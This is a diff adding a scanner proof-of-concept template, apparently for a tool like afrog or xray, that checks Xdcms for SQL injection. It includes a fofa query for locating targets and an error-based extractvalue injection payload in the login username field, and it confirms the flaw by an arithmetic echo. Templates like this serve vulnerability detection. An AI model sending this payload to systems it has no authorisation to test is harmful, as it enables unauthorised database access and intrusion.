@@ -1,0 +1,25 @@
+id: xdcms-sqli
+
+info:
+  name: Xdcms sqli
+  author: amos1
+  severity: high
+  verified: false
+  description: |
+    Xdcms 存在 SQL 注入漏洞，攻击者可以通过构造特殊的请求参数，在服务器上执行任意 SQL 语句。
+    fofa: app="Xdcms"
+  tags: xdcms,sqli
+  created: 2025/03/13
+
+set:
+  r1: randomInt(800000000, 1000000000)
+  r2: randomInt(800000000, 1000000000)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /index.php?m=member&f=login_save
+      body: |
+        username=dd' or extractvalue(0x0a,concat(0x0a,{{r1}}*{{r2}}))#&password=dd&submit=+%B5%C7+%C2%BC+
+    expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
+expression: r0()
